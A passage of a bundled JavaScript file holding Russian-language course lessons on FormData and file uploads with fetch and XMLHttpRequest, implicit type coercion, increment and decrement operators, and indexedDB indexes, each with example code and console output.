avatar.src = picture\n  photo.value = picture\n}\n\npassword.oninput = function (event) {\n  const pass = event.target.value\n  event.target.valid = pass.length > 6 && !!pass.match(/\\d/) && !!pass.match(/\\D/)\n  event.target.style.color = event.target.valid ? 'green' : 'red'\n  passwordCheck.disabled = !event.target.valid\n}\n\npasswordCheck.oninput = function (event) {\n  Object.assign(event.target, {\n    valid: event.target.value === password.value,\n    style: `color: ${event.target.valid ? 'green' : 'red'}`\n  })\n}\n\npasswordCheck.onchange = function (event) {\n  event.target.valid\n    ? passwordHash.value = Sha256.hash(event.target.value)\n    : null\n}\n\nsubmit.onclick = function (event) {\n  const formData = new FormData(form)\n\n  const result = {}\n\n  formData.forEach((val, key) => Object.assign(result, { [key]: val }))\n\n  fetch(url, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(result)\n  })\n    .then(response => response.json())\n    .then(response => {\n      currentUser = response\n      userInfoName.innerText = currentUser['user-name']\n      userInfoAvatar.src = currentUser['user-photo']\n\n      ;['id', 'pass-hash']\n        .forEach(key => { document.cookie = `${key}=${currentUser[key]}` })\n  \n      registration.style.display = 'none'\n      userInfo.style.display = 'block'\n    })\n}\n~~~~\n\n________________________________________________\n\n\n[![ico-25 cap] **Live demo**](https://garevna.github.io/js-samples/#29)\n\n________________________________________________\n\nОбратите внимание, что в этом примере мы делаем скрытые поля формы, которые не отображаются пользователю, однако их содержимое будет включено в объект ~formData~\n\nПри этом в форме есть поля, не имеющие атрибута ~name~\nОни отображаются пользователю, однако их содержимое не будет включено в объект ~formData~\n\n____________________________________________\n\n## ![ico-25 icon] Методы\n\n![ico-20 icon] append()\n\nПринимает два аргумента - имя ключа и его значение\n\nЕсли такого ключа еще нет, добавляет пару ключ/значение\n\nЕсли такой ключ уже существует, добавляет ему новое значение\n\n~~~js\nconst formData = new FormData()\nformData.append('username', 'garevna')\nformData.append('token', 'HgTY78-jdfhj91*/jskdfj')\n~~~\n\n![ico-20 icon] has()\n\n~~~js\nformData.has('token')     // true\n~~~\n\n![ico-20 icon] get()\n\n~~~js\nformData.get('username')  // \"garevna\"\nformData.get('token')     // \"HgTY78-jdfhj91*/jskdfj\"\n~~~\n\n![ico-20 icon] getAll()\n\nВозвращает массив всех значений, связанных с указанным в аргументе ключом\n\n~~~js\nformData.append('pictures', 'http://icecream.me/uploads/b0d4d73f21508dd67e0c57a590f582f0.png')\nformData.getAll('pictures')\nformData.append('pictures', 'https://github.com/garevna/js-course/raw/master/images/js_cup-ico.png')\nformData.getAll('pictures')\n~~~\n\n![ico-20 icon] set()\n\nАргументы: ключ, значение\n\nЕсли указанный аргументом ключ уже существует, устанавливает ему новое значение, в противном случае добавляет новый ключ и значение\n\n~~~js\nformData.set('token', 'gF&op*i91/54gkjHU')\nformData.get('token')  // \"gF&op*i91/54gkjHU\"\n~~~\n\n![ico-20 icon] delete()\n\n~~~js\nformData.delete('token')\nformData.get('token')    // null\n~~~\n\n![ico-20 icon] keys()\n\nВозвращает объект-итератор (будем изучать позже)\n\n![ico-25 cap] ** 2**\n\n~~~js\nconst iterator = formData.keys()\niterator.next()\niterator.next()\n...\n~~~\n\n![ico-20 icon] entries()\n\nВозвращает объект-итератор (будем изучать позже)\n\n![ico-25 cap] ** 3**\n\n~~~js\nconst iterator = formData.entries()\niterator.next()\niterator.next()\n...\n~~~\n\n![ico-25 cap] ** 4**\n\n~~~js\nconst formData = new FormData()\n\nformData.append('name', 'Peter')\nformData.append('age', 25)\nformData.append('speciality', 'dev')\n\nformData.forEach(item => console.log(item))\n\n// Peter\n// 25\n// dev\n\nconst iterator = formData.entries()\n\nconst result = []\n\ndo {\n  var { value, done } = iterator.next()\n  value && result.push(value)\n} while (!done)\n\nconsole.log(result)\n\n~~~\n\n~~~console\n\n► (3) [Array(2), Array(2), Array(2)]\n   ► 0: (2) ['name', 'Peter']\n   ► 1: (2) ['age', '25']\n   ► 2: (2) ['speciality', 'dev']\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Отправка данных на сервер\n\n### ![ico-20 icon] fetch\n\n![ico-25 cap] ** 5**\n\n~~~js\nconst fileSelector = document.body\n  .appendChild(document.createElement('input'))\n\nfileSelector.type = 'file'\n\nconst formData = new FormData()\n\nfileSelector.onchange = function (event) {\n  formData.append('avatar, this.files[0])\n\n  fetch('https://httpbin.org/post', {\n    method: 'POST',\n    body: formData\n  })\n    .then(response => response.json())\n    .then(response => console.log(response))\n}\n~~~\n\n____________________________________\n\n### ![ico-20 icon] XMLHttpRequest\n\n![ico-25 cap] ** 6**\n\n~~~js\nconst fileSelector = document.body\n  .appendChild(document.createElement('input'))\n\nfileSelector.type = 'file'\n\nconst formData = new FormData()\n\nfileSelector.onchange = function (event) {\n  formData.append('avatar', this.files[0])\n\n  const request = new XMLHttpRequest()\n  request.open('POST', 'https://httpbin.org/post')\n  request.onreadystatechange = function (event) {\n    if (this.readyState < 4) return\n    console.log(this.status, this.response)\n  }\n  request.send(formData)\n}\n~~~\n\n**Посмотрим, что ответил сервер**\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FformData-1.png)\n\n\nКак мы видим, файл изображения был передан на сервер как строка закодированных двичных данных\n\n~~~console\ndata:[<media type>][;base64],<data>\n~~~\n\n**_base64_** указывает, что содержимое является двоичными данными, закодированными с использованием [схемы **Base64**](https://www.base64encode.org/)\n\n______________________________________________________\n\n![ico-25 cap] ** 7**\n\n![ico-20 warn] Для выполнения упражнения перейдем на страницу ![ico-30 toilet] http://ptsv2.com\n\n^^не забудьте заменить _garevna_ на свой идентификатор^^\n\n**Загрузка изображения с клиента**\n\n~~~js\nconst fileSelector = document.body\n  .appendChild(document.createElement('input'))\n\nfileSelector.type = 'file'\n\nconst formData = new FormData()\n\nfileSelector.onchange = function (event) {\n  formData.append('avatar', this.files[0])\n\n  const request = new XMLHttpRequest()\n  request.open('POST', 'http://ptsv2.com/t/garevna/post')\n  request.send(formData)\n}\n~~~\n\n**прочитаем записанное**\n\n~~~js\nconst request = new XMLHttpRequest()\nrequest.open('GET', 'http://ptsv2.com/t/garevna/d/1110001/json')\nrequest.onreadystatechange = function (event) {\n  if (this.readyState < 4) return\n  const result = JSON.parse(this.response)\n  const img = document.querySelector('img')\n  img.src = `data:image/png;base64,${result.Files[0].Content}`   \n}\nrequest.send()\n~~~\n\nПосле выполнения этого кода вы увидите, что на странице изображение\n\n![](http://ptsv2.com/static/ToiletLogo.jpg)\n\nбудет заменено на выбранное изображение\n\n______________________________________________________________________________\n\n## ![ico-25 icon] Endpoints для самостоятельной работы\n\n••https://garevna-form-data.glitch.me/forms/&lt;id>••\n\n### ![ico-20 icon] GET\n\n◘◘![ico-20 cap] 8◘◘\n\n~~~js\nfetch('https://garevna-form-data.glitch.me/forms/all')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\n~~~console\n▼ {goblin: {…}, frodo: {…}, garevna: {…}, begemot: {…}, bomb: {…}, …}\n  ► begemot: {name: \"Cat\", age: \"15\", avatar: {…}}\n  ► bomb: {name: \"Serafim\", age: \"27\", avatar: {…}}\n  ► frodo: {name: \"Frodo\", age: \"18\", avatar: {…}}\n  ► garevna: {name: \"Irina\", age: \"16\", avatar: {…}}\n  ► goblin: {name: \"Grig\", age: \"21\", avatar: {…}}\n  ► safari: {name: \"Grig\", age: \"25\", avatar: {…}}\n  ► __proto__: Object\n~~~\n\n◘◘![ico-20 cap] 9◘◘\n\n~~~js\nfunction getFormData (url) {\n  fetch(url)\n    .then(response => response.formData())\n    .then(formData => formData.forEach(prop => console.log(prop)))\n}\n\ngetFormData('https://garevna-form-data.glitch.me/forms/frodo')\n~~~\n\n~~~console\nFrodo\n18\n▼ File {name: \"upload_d3a3179170b5ddaf0fee28e32799cc32.jpg\", lastModified: 1572253559576, lastModifiedDate: Mon Oct 28 2019 11:05:59 GMT+0200 (Восточная Европа, стандартное время), webkitRelativePath: \"\", size: 15068, …}\n    lastModified: 1572253615903\n  ► lastModifiedDate: Mon Oct 28 2019 11:06:55 GMT+0200 (Восточная Европа, стандартное время) {}\n    name: \"upload_d3a3179170b5ddaf0fee28e32799cc32.jpg\"\n    size: 15068\n    type: \"image/jpeg\"\n    webkitRelativePath: \"\"\n  ► __proto__: File\n~~~\n\n◘◘![ico-20 cap] 10◘◘\n\n~~~js\nconst api = 'https://garevna-form-data.glitch.me/forms'\n\nconst addElem = (tagName, container = document.body) => {\n  return container.appendChild(document.createElement(tagName))\n}\n\nconst readFile = file => {\n  const reader = new FileReader()\n  return new Promise(resolve => {\n    reader.onload = event => resolve(event.target.result)\n    reader.readAsDataURL(file)\n  })\n}\n\nasync function getFormData (login) {\n  const response = await fetch(`${api}/${login}`)\n\n  if (response.status !== 200) return { status: response.status, result: null }\n\n  const formData = await response.formData()\n\n  const iterator = formData.entries()\n\n  const result = {}\n\n  do {\n    var { value, done } = iterator.next()\n    if (value) {\n      const [key, val] = value\n      console.log(key, val)\n      if (val.type && !val.type.indexOf('image')) {\n        const picture = document.createElement('img')\n        picture.src = await readFile(val)\n        Object.assign(result, { [key]: picture })\n      } else Object.assign(result, { [key]: val })\n    }\n  } while (!done)\n\n  return { status: 200, result }\n}\n\nconst response = await getFormData('goblin')\n  .catch(err => console.warn(err))\n\nconst { status, result } = response || {}\n\nstatus === 200 && document.body.appendChild(result.avatar)\n~~~\n\n________________________________________________________\n\n### ![ico-20 icon] POST | PUT | PATCH\n\n••https://garevna-form-data.glitch.me/form/&lt;id>••\n\n~~~html\n<form id=\"form\">\n  <p>Name</p>\n  <input id=\"userName\" name=\"name\" placeholder=\"Name\">\n  <p>Age</p>\n  <input\n    type=\"number\"\n    id=\"userAge\" \n    name=\"age\"\n    placeholder=\"Age\"\n  />\n  <p>Your Photo</p>\n  <input\n    type=\"file\" \n    id=\"avatar\" \n    name=\"avatar\" \n  />\n  <img\n    id=\"userPhoto\"\n    src=\"https://forexi.ru/wp-content/uploads/2019/02/teacher1.png\" width=\"70\"\n  />\n</form>\n\n<button id=\"submit\">Submit</button>\n~~~\n\nВвод логина прийдется сделать отдельно ![ico-20 smile]\n\n~~~js\nconst login = 'bandit'\n\nconst formData = new FormData(document.getElementById('form'))\n\nfetch(`https://garevna-form-data.glitch.me/form/${login}`, {\n  method: 'POST',\n  body: formData\n}).then(response => console.log(response.status))\n~~~\n\n^^Обратите внимание, что при отправке фетчем POST-запроса заголовок ~'Content-Type': \"multipart/form-data\"~ лучше не указывать^^\n^^Браузер сам добавит нужный заголовок и разделитель ( ~boundary~ )^^\n^^В противном случае на сервер приходит пустой объект^^\n\n________________________________________________________\n\n[:::Live Demo:::](https://garevna-form-data.glitch.me/)  \n[![ico-50 git] Live Demo](https://garevna.github.io/js-samples/#47)"},97903:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Приведение типов\n\n\n## ![ico-25 icon] Неявное приведение типов\n\nНеявное приведение типов происходит в процессе вычисления выражений\n\n### ![ico-20 icon] Неявное приведение к string\n\nПри сложении числа и строки JavaScript обрабатывает число как строку\n\n^^Например, после выполнения кода:^^\n\n~~~js\nvar res = 20 + '5'\n~~~\n\n^^значением переменной **res** будет строка _\"205\"_^^\n\nJavaScript вычисляет выражения слева направо\n\n^^В результате выполнения кода:^^\n\n~~~js\nvar res = 20 + 10 + '5'\n~~~\n\n^^в переменной ~res~ будет значение \"305\",^^\n\n^^а в результате выполнения кода:^^\n\n~~~js\nvar res = '3' + 20 + 10\n~~~\n\n^^в переменной ~res~ будет значение _\"32010\"_^^\n\n![ico-20 warn] При сложении массива и любого другого операнда результат будет строкового типа ( ~string~ )\n\n![ico-25 cap] ** 1**\n\n~~~js\n[] + 5             //  \"5\"\n[] + false         //  \"false\"\n[4] + NaN          //  \"4NaN\"\n[4, 8] + null      //  \"4,8null\"\nnull + [4, 8]      //  \"null4,8\"\n~~~\n\nЭто происходит потому, что массив преобразуется в строку:\n\n~~~js\nString([4, 8])\n~~~\n\nи результат будет   ~4,8~\n\n![ico-20 warn] Однако, если в массиве не более одного элемента, и перед массивом стоит знак арифметической операции, он будет приведен к числу:\n\n![ico-25 cap] ** 2**\n\n~~~js\nnull + +[4]       // 4\n+[5] + null         // 5\n~~~\n\n_____________________________________________________________________\n\n### ![ico-20 icon] Неявное приведение к number\n\n\nНеявное приведение к типу  ~number~ происходит в арифметических выражениях:\n\n~~~js\nvar  x = '8' / 2\n~~~\n\n^^( значением переменной ~ x~ будет 4 )^^\n\n![ico-20 warn] При участии в арифметических операциях пустая строка ( ~\"\"~ ) и пустой массив ( ~[]~ ) преобразуется в ** 0**:\n\n~~~js\nvar x = ''\nvar y = x / 5\n~~~\n\n^^( выражение  ~\"\" / 5~   будет приведено к   ~0 / 5~ )^^\n\n~~~js\nconsole.log(+'')         // 0\nconsole.log(+[])         // 0\nconsole.log(+[]+'')      // 0\n~~~\n\n![ico-20 warn] Если в арифметическом выражении участвуют специальные значения ~undefined~ или ~null~, то они преобразуются к числу так:\n\n~~~js\nNumber(undefined)   // NaN\nNumber(null)        // 0\n~~~\n\n![ico-20 warn] Если в арифметическом выражении участвуют логические значения ~true~ или ~false~, то они преобразуются к числу так:\n\n~~~js\nvar a = false\nvar b = true\nvar z = a + b    //  0 + 1 --\x3e 1\n~~~\n\n![ico-20 warn] Кроме арифметических операций, преобразование к типу ~number~ происходит при участии переменной в операциях сравнения ( за исключением операций   ~===~  и  ~!==~,  когда сравниваются не только значения, но и типы данных )\n\n____________________________________________________________\n\n![ico-25 cap] ** 3**\n\n~~~js\na = false, b = undefined\na > b       // 0 > NaN  --\x3e false\na < b       // 0 < NaN  --\x3e false\na == b      // 0 == NaN --\x3e false\n~~~\n\n![ico-25 cap] ** 4**\n\n~~~js\na = true,  b = null\na > b       // 1 > null   --\x3e true ( 1 > 0 )\na < b       // 1 < null   --\x3e false\na == b      // 1 == null  --\x3e false\n~~~\n\n______________________________________________________\n\n### ![ico-20 icon] Неявное приведение к boolean\n\nПреобразование типов к логическому типу ( ~boolean~ ) происходит в условных операторах ( ~if~, тернарный оператор )\n\n![ico-25 cap] ** 5**\n\n~~~js\nif ('5') console.log('Yes')\n~~~\n\nБудет вычисляться логическое значение выражения  в круглых скобках оператора ~if~, т.е. \"под капотом\" будет выполнена операция\n\n~~~js\nBoolean('5')\n~~~\n\n![ico-20 warn] При выполнении логических операций  ~&#10072;&#10072;~  и  ~&&~ происходит неявное приведение типов операндов к логическому значению, но при этом результатом логической операции будет изначальное значение одного из операндов, даже если оно не являются булевым\n\n_______________________________________________\n\n#### ![ico-20 icon] &&\n\n^^^[Операция&nbsp;&&]\n\nОперация ~&&~  перебирает операнды слева направо, приводя их к логическому значению, до тех пор, пока не встретится первый ~false~\n\nв этом случае возвращается исходное значение последнего операнда\n\n![ico-25 cap] ** 6**\n\n~~~js\ntrue && false && null   //  false\ntrue && '5' && null     //  null\ntrue && [] && null      //  null\n~~~\n\n![ico-25 cap] ** 7**\n\n~~~js\ntrue && ![] && null     //  false\n~~~\n\n^^вычисляется значение второго операнда ~![]~, оно будет ~false~, операция останавливается и возвращается последний операнд, на котором остановились )^^\n\n~~~js\ntrue && true && true && true     //    true\n~~~\n\n^^дошли до конца, но не встретили ~false~, возвращается последний операнд^^\n\n^^^\n__________________________________________________________________\n\n#### ![ico-20 icon] ||\n\n^^^[Операция ||]\n\nОперация ~||~  перебирает операнды слева направо, приводя их к логическому значению, до тех пор, пока не встретится первый ~true~\n\nв этом случае возвращается исходное значение последнего операнда, на котором остановились\n\n![ico-25 cap] ** 8**\n\n~~~js\nnull || false || 5 || ''          //   5\nnull || '' || 0 || 4 || 10        //   4\n~~~\n\n![ico-25 cap] ** 9**\n\n~~~js\nnull || false || undefined || ''  //  \"\"\n~~~\n\n^^последовательно вычисляются логические значения^^\n\n^^• первого операнда (~null~) - это ~false~,^^\n^^• второго операнда - ~false~,^^\n^^• третьего операнда (~undefined~) - это ~false~,^^\n^^• четвертого операнда (~\"\"~) - это ~false~^^\n\n^^больше операндов нет, операция завершается и возвращает последний операнд, на котором остановилась ( ~\"\"~ )^^\n\n^^^\n\n#### ![ico-20 icon] !!\n\n^^^[Операция !!]\n\nможно привести переменную любого типа к ~boolean~ с помощью логической операции двойного отрицания:\n\n~~~js\nvar x = null\nvar y = !!x        // false\n~~~\n\n~~~js\nvar x = undefined\nvar y = !!x        // false\n~~~\n\n~~~js\n!![ ]      // вернет   true\n!!+[ ]     // вернет  false\n~~~\n\n^^^\n\n{{{Implicit-type-conversion.js}}}\n\n_____________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLSdFHuyyukF2rmA04BN1AmS5MCNXWgQmR5t7mmxyTpzdBZVGGw/viewform)\n\n_____________________________________________________________________\n\n[![ico-20 link] ^^w3schools^^](https://www.w3schools.com/jsref/jsref_infinity.asp)\n[![ico-20 link] ^^Equality in JavaScript^^](https://dorey.github.io/JavaScript-Equality-Table/unified/)\n"},34949:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] Инкремент\n\nИнкремент - это увеличение значения числовой переменной на единицу\n\nПост-префиксная форма:   **~y++~**\n\nПрефиксная форма:        **~++y~**\n\nПост-префиксная форма означает, что переменная будет увеличена после операции, в которой она принимает участие\n\n![ico-25 cap]\n\n~~~javascript\nvar x = 0, y = 2\nvar z = y + x++\n~~~\n\n^^После операции:^^\n\n~~~javascript\nvar z = y + x++\n~~~\n\n^^значение переменной ** z** будет ~2 + 0 = 2~,^^\n^^а значение переменной ** x** станет равным ~1~^^\n\n^^А вот после такой операции:^^\n\n~~~javascript\nvar x = 0, y = 2\nvar z = y + ++x\n~~~\n\n^^сначала значение переменной ** x** станет ~0 + 1 = 1~,^^\n^^а затем будет вычислено значение переменной ** z**:  ~2 + 1 = 3~^^\n\n________________________________________________________\n\n## ![ico-25 icon] Декремент\n\nВсе то же самое, только значение не увеличивается на 1, а уменьшается ![ico-25 smile]\n\n~~~javascript\nvar x = 0, y = 2\nvar z = --y + ++x\n~~~\n\n^^сначала значение переменной ** y** станет ~2 - 1 = 1~,^^\n^^значение переменной ** x** станет ~0 + 1 = 1~,^^\n^^а затем будет вычислено значение переменной ** z**:  ~1 + 1 = 2~^^\n\n_______________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLSdsKuS6kG1r5O3H62G_m32NK8a88jmFmJ5e4N2uAiDLAb31xQ/viewform)\n\n______________________________________________________________\n\n[![ico-20 link] ^^MDN^^](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators)\n"},17310:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] indexedDB\n\n______________________________________________________\n\n## ![ico-25 icon] Индекс\n\n| ^^Итак, мы уже поняли, что при создании хранилища мы определяем, как будут идентифицироваться записи в хранилище по ключам:<br>либо ключи будут указываться каждый раз при записи данных,<br>либо мы предоставим это дело API, чтобы он автоматически генерировал уникальный целочисленный ключ для каждой записи ( в этом случае наше хранилище будет подобно массиву ),<br>либо мы укажем в свойстве ~keyPath~ имя одного из ключей записи базы данных ( в этом случае записи в хранилище должны быть объектами, каждый из которых просто обязан иметь такое свойство )^^ |\n\nОднако один-единственный ключ сильно сужает наши возможности в плане поиска нужных данных\nТем более, что ключ записи обязательно должен быть уникальным\nНам нужно больше ключей,\nмы хотим получить гибкий интерфейс доступа к записям в хранилищах\n\nДля этого нужны специальные объекты - **индексы**\n\nКаждый такой объект:\n\n| ![ico-20 speach] | всегда связан с конкретным хранилищем базы данных |\n| ![ico-20 speach] | является и сам хранилищем, но служебным ( обслуживающим определенное хранилище базы данных ) |\n| ![ico-20 speach] | хранит упорядоченные ( отсортированные ) значения ключа и ссылку на запись с таким значением ключа |\n| ![ico-20 speach] | допускает дублирующиеся значения ключей |\n\n| ![ico-20 warn] | Каждый индекс имеет имя |\n| ![ico-20 warn] | Для каждого ключа, по которому вы хотите индексировать хранилище, создается отдельный индекс |\n| ![ico-20 warn] | Каждое хранилище может иметь несколько индексов |\n| ![ico-20 warn] | Ссылка на хранилище, которое \"обслуживает\" индекс, находится в его свойстве **objectStore** |\n\n\nДавайте посмотрим на объект индекса повнимательнее\n\n~~~js\nconsole.dir(IDBIndex)\n~~~\n\n^^^[IDBIndex]\n\n~~~console\n▼ ƒ IDBIndex()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"IDBIndex\"\n  ▼ prototype: IDBIndex\n      ► count: ƒ count()\n      ► get: ƒ ()\n      ► getAll: ƒ getAll()\n      ► getAllKeys: ƒ getAllKeys()\n      ► getKey: ƒ getKey()\n        keyPath: (...)\n        multiEntry: (...)\n        name: (...)\n        objectStore: (...)\n      ► openCursor: ƒ openCursor()\n      ► openKeyCursor: ƒ openKeyCursor()\n        unique: (...)\n      ► constructor: ƒ IDBIndex()\n        Symbol(Symbol.toStringTag): \"IDBIndex\"\n      ► get keyPath: ƒ keyPath()\n      ► get multiEntry: ƒ multiEntry()\n      ► get name: ƒ name()\n      ► set name: ƒ name()\n      ► get objectStore: ƒ objectStore()\n      ► get unique: ƒ unique()\n      ► __proto__: Object\n  ► __proto__: ƒ ()\n~~~\n\n^^^\n\nМы видим в свойстве ~prototype~:\n\nВычисляемые свойства:\n\n| **name**        | ~string~  | имя индекса |\n| **keyPath**     | ~string~  | имя ключевого поля, по которому будет индексироваться хранилище |\n| **unique**      | ~boolean~ | должен ли ключ быть уникальным |\n| **multiEntry**  | ~boolean~ | если ключ является массивом, использовать ли каждый элемент массива как отдельный ключ |\n| **objectStore** | ~string~  | хранилище, которое обслуживает индекс |\n\n^^Их значения будут установлены в момент создания индекса^^\n\n_______________________________\n\nУнаследованные методы экземпляра **IDBIndex** частично \"перекрывают\" унаследованные методы экземпляра **IDBObjectStore**:\n\n| **count**      |                   |\n| **get**        | **getAll**        |\n| **getKey**     | **getAllKeys**    |\n| **openCursor** | **openKeyCursor** |\n\n___________________________________________\n\n### ![ico-20 icon] Создание индексов\n\nСоздать индекс можно с помощью метода хранилища **createIndex**\n\n![ico-20 green-ok] Первый аргумент метода **createIndex** - это имя индекса,\n![ico-20 green-ok] Второй аргумент - это имя ключа, значения которого буду храниться в объекте индекса\n^^(это будет значением свойства **keyPath** индекса)^^\n^^имя ключа - это имя свойства объекта ( записи ) в хранилище, которое обслуживает индекс^^\n![ico-20 green-ok] Третий аргумент - объект опций:\n\n^^^[Опции]\n• **unique** (true / false) - должно ли значение ключа быть уникальным\n• **multiEntry** (true / false)\n^^для ситуаций, когда ключ (**~keyPath~**) является массивом ^^\n^^если ~true~, в индекс будет добавлена запись для каждого элемента массива^^\n^^если ~false~, то в индекс будет добавлена одна запись, содержащая массив^^\n• **locale** - языковой стандарт, который будет использоваться при сортировке значений\n^^(ну, сами понимаете, _en-US_ там, или _auto_, если хотите как в настройках юзера)^^\n\n^^^\n\n____________________________________________________________________\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst createUsersDB = users => new Promise((resolve, reject) => {\n  Object.assign(indexedDB.open('users'), {\n    onupgradeneeded: function (event) {\n      if (event.target.result.objectStoreNames.contains('userStore')) {\n        return event.target.result.objectStore('userStore')\n      }\n        \n      const store = event.target.result\n        .createObjectStore('userStore', { autoIncrement: true })\n        .createIndex('nameIndex', 'name', { unique: false })\n        .objectStore\n        .createIndex('hobbyIndex', 'hobby', { unique: false })\n        .objectStore\n\n      users.forEach(user => store.put(user))\n    },\n    onsuccess: event => resolve(event.target.result),\n    onerror: event => reject(event.target.error)\n  })\n})\n\nasync function callUsers () {\n  const users = await (await fetch('https://garevna-json-server.glitch.me/users')).json()\n  return await createUsersDB(users).catch(error => console.warn(error))\n}\n\ncallUsers().then(resp => console.log(resp))\n~~~\n\n^^^[Описание]\nФункция **createUsersDB** получает в качестве аргумента ссылку на масив **users**\nи возвращает промис\nПромис резолвится ссылкой на экземпляр интерфейса базы данных\nПри первом первом подключении к базе данных создается хранилище **userStore** с автоматической генерацией ключей записей\nЭта операция возвращает ссылку на объект хранилища, поэтому можно сразу вызывать метод **createIndex**, что мы и делаем\nв результате получаем ссылку на объект индекса, у которого есть свойство **objectStore** - ссылка на хранилище, которое обслуживает индекс\nС помощью этой ссылки опять возращаемся к хранилищу, чтобы создать второй индекс\nИтак, теперь у нас есть хранилище с двумя индексами: **nameIndex** и **hobbyIndex**\nИз названия индексов понятно, что первый будет индексировать записи по ключу **name**, а второй - по ключу **hobby**,\n( причем позже вы увидите, что свойство **hobby** - это массив )\nОсталось добавить данные в хранилище **userStore** из массива **users**, ссылка на который получена аргументом\n\nДля получения данных ( массива **users** ) нужно сделать запрос на сервер,\nв результате которого мы также получим промис\n\nПоэтому \"заворачиваем\" эти два промиса в асинхронную функцию **callUsers**\nОсталось только вызывать **callUsers**\n\n^^^\n\n**userStore**\n\n| # | Key | Value                                                               |\n| 0 | 1   | ► { name: \"Stephan\",birthYear: 1995, family: {...}, hobby: Array(2) } |\n| 1 | 2   | ► { name: \"Andry\",birthYear: 1998, family: {...}, hobby: Array(1) }   |\n\n**nameIndex**\n\n| # | Key(keyPath:\"name\") | Primary key | Value                                                                 |\n| 0 | Andry               | 2           | ► { name: \"Andry\",birthYear: 1998, family: {...}, hobby: Array(1) }   |\n| 1 | Stephan             | 1           | ► { name: \"Stephan\",birthYear: 1995, family: {...}, hobby: Array(2) } |\n\n**hobbyIndex**\n\n| # | Key(keyPath:\"hobby\")   | Primary key | Value                                                                 |\n| 0 | ► [\"dancing\"]          | 2           | ► { name: \"Andry\",birthYear: 1998, family: {...}, hobby: Array(1) }   |\n| 1 | ► [\"footbal\",\"fising\"] | 1           | ► { name: \"Stephan\",birthYear: 1995, family: {...}, hobby: Array(2) } |\n\n________________________________________\n\n#### multiEntry\n\nУдалите базу данных во вкладке **Application** Chrome DevTools\nПовторим создание базы данных, но теперь внесем незначительные изменения в код предыдущего примера,\nа именно - создадим второй индекс с опцией **multiEntry** (~true~):\n\n~~~js\nconst createUsersDB = users => new Promise((resolve, reject) => {\n  ...\n    .objectStore\n      .createIndex('hobbyIndex', 'hobby', { unique: false, multiEntry: true })\n  ...\n})\n...\n~~~\n\nТеперь посмотрим на результат:\n\n**hobbyIndex**\n\n| # | Key(keyPath:\"hobby\") | Primary key | Value                                                                 |\n| 0 | \"dancing\"            | 2           | ► { name: \"Andry\",birthYear: 1998, family: {...}, hobby: Array(1) }   |\n| 1 | \"fising\"             | 1           | ► { name: \"Stephan\",birthYear: 1995, family: {...}, hobby: Array(2) } |\n| 1 | \"footbal\"            | 1           | ► { name: \"Stephan\",birthYear: 1995, family: {...}, hobby: Array(2) } |\n\n![ico-20 warn] Теперь каждое значение из массива **hobby** входит в индекс отдельным ключом\n\n___________________________________________________________\n\nВ нашем распоряжении есть endpoint: **~https://garevna-json-server.glitch.me/lessons~**\n\nЗадача:\nсоздать базу данных с хранилищами **lessonStore** и **topicStore** с индексами\nи поместить туда данные, полученные с удаленного сервера\n\n^^Чтобы посмотреть структуру исходных данных, вы можете получить их и вывести в консоль:^^\n\n~~~js\nfetch('https://garevna-json-server.glitch.me/lessons')\n  .then(response => response.json())\n  .then(response => console.log(response))\n~~~\n\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst openDB = (nameDB, verDB) => new Promise((resolve, reject) => {\n  const request = indexedDB.open(nameDB, verDB)\n  request.onupgradeneeded = \n  request.onversionchange = request.onsuccess = event => resolve(event)\n  request.onerror = event => reject(event.target.error.name)\n})\n\nlet DB, data, lessonStore, topicStore\n\nconst openDBCallback = event => {\n  DB = event.target.result\n\n  lessonStore = DB.createObjectStore('lessonStore', { autoIncrement: true })\n  lessonStore.createIndex('lesson', 'lesson', { unique: true })\n\n  topicStore = DB.createObjectStore('topicStore', { autoIncrement: true })\n  topicStore.createIndex('topic', 'topic', { unique: true })\n  topicStore.createIndex('lesson', 'lesson', { unique: false })\n\n  data.forEach(lesson => pushLesson(lesson))\n}\n\n\nfunction pushLesson (lesson) {\n  const request = lessonStore.add({ lesson: lesson.id })\n  request.onerror = event => console.warn ( `Error ${event.target.error.name}: ${lesson.id}` )\n  request.onsuccess = event => {\n    const lessonIndex = event.target.result\n    lesson.items.forEach(topic => pushTopic(lessonIndex, topic))\n  }\n}\n\nfunction pushTopic (lessonIndex, topic) {\n  const request = topicStore.add({\n    topic: topic.title,\n    ref: topic.ref,\n    lesson: lessonIndex\n  })\n  request.onerror = event => console.warn(`Error ${event.target.error.name}:\\n${topic.title} (${lessonIndex})`)\n  request.onsuccess = event => console.log(`success ${lessonIndex}: ${topic.title}`)\n}\n\n\nasync function createLessonsDB () {\n  data = await (await fetch('https://garevna-json-server.glitch.me/lessons')).json()\n  openDB('lessonsDB').then(openDBCallback)\n}\n\ncreateLessonsDB()\n~~~\n\n![](https://cdn.glitch.com/a4e0a9fd-ea7b-47cf-b52a-48fd6359c559%2FindexedDB-index-1.gif)\n\n^^^[Описание]\n\nДля создания базы данных мы будем использовать промисифицированную функцию **openDB**:\n\n◘◘**openDB**◘◘\n\n~~~js\nconst openDB = (nameDB, verDB) => new Promise((resolve, reject) => {\n  Object.assign(indexedDB.open(nameDB, verDB), {\n    onupgradeneeded: event => resolve(event),\n    onversionchange: event => resolve(event),\n    onsuccess: event => resolve(event),\n    onerror: event => reject(event.target.error.name)\n  })\n})\n~~~\n\nТеперь объявим переменные, в которых будут доступные для любого колбэка ссылки:\n• на интерфейс базы данных ( переменная **DB** )\n• на исходные данные, которые мы получим с удаленного сервера и будем помещать в базу данных ( переменная **data** )\n• на хранилище **lessonStore** ( переменная **lessonStore** )\n• на хранилище **topicStore** ( 